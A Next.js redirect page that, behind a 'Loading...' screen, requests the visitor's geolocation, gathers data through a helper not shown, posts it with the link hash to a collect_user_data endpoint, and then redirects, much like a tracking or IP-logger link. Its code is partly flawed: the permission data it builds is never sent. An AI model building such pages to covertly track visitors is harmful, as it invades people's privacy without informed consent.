"use client";
import React from "react";
import { useEffect } from "react";
import ErrorPage from "../../../components/ui/error-page";
import processData from "../../../utils/getdata";
import { useParams } from "next/navigation";
import { collect_user_data } from "../../../utils/api/collect_user_data";
export default function Redirect() {
  try {
    const params = useParams<{ hash: string }>();
    const hash = params.hash;
    useEffect(() => {
      let geolocationPermission: string | undefined;
      async function fetch(timeoutMs = 6000) {

        try {
          // Request permission by trying to get position

          await new Promise<GeolocationPosition>((resolve, reject) => {
            let didFinish = false;

            const timer = setTimeout(() => {
              if (!didFinish) {
                didFinish = true;
                reject(new Error("Geolocation request timed out or blocked"));
              }
            }, timeoutMs);

            navigator.geolocation.getCurrentPosition(
              (pos) => {
                if (!didFinish) {
                  clearTimeout(timer);
                  didFinish = true;
                  resolve(pos);
                }
              },
              (err) => {
                if (!didFinish) {
                  clearTimeout(timer);
                  didFinish = true;
                  reject(err);
                }
              }
            );
          });
        } catch (err) {
          geolocationPermission = "denied";
          console.log("User denied location access.");
        }
      }

      async function send() {
        try {
          const perm = await (navigator as any).permissions?.query?.({
            name: "geolocation",
          });
          geolocationPermission = perm?.state || "granted";
          const data = await processData()();
          const updatedData = {
            ...data,
            permission: { geolocation: geolocationPermission },
          };

          const response = await collect_user_data(data, hash);
          console.log(response);
          window.location.href = response?.url!;
        } catch (error: any) {
          console.log(error);
        }
      }

      fetch();
      send()

      // Check permission state afterward (optional)
    }, []);
  } catch (error: any) {
    return <ErrorPage />;
  }
  return (
    <div className=" w-full h-screen bg-[hsl(240,2%,8%)] flex items-center justify-center ">
      <p className="w-fit  mx-auto text-xl sm:text-2xl font-semibold font-sans text-gray-100">
        Loading... wait for a moment!
      </p>
    </div>
  );
}
